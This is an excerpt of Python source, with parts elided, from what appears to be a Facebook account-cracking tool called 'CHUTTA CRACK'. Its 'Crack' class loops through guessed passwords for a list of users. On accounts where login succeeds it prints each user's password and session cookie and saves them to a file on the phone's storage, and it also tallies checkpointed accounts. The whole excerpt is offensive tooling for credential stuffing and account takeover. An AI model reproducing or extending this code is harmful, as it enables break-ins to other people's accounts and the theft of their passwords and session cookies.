...
class Crack:
	...
	def metode_api(self,user,pwx):
		prog.update(des,description=f"{H2}[CH💥]{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {P2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					prints(f" [CHUTTA-444🤡OK] {H2}{user}|{pw}{P2}  [JUST NOW] \n[💥]={M2}=COOKIE {H2} •  {H2}{coki}\n")
					
					open('/sdcard/CH-OK.txt','a').write(f"{user}|{pw}|{coki}\n")
					break
	...
	def simpan_hasil(self):
		prints(f"""{K2}CHUTTA CRACK OK DATE : CH-OK.txt
{K2}CHUTTA CRACK CP DATE : CH-CP.txt\n""")
###----------[ MENU ]---------- ###
class Back:
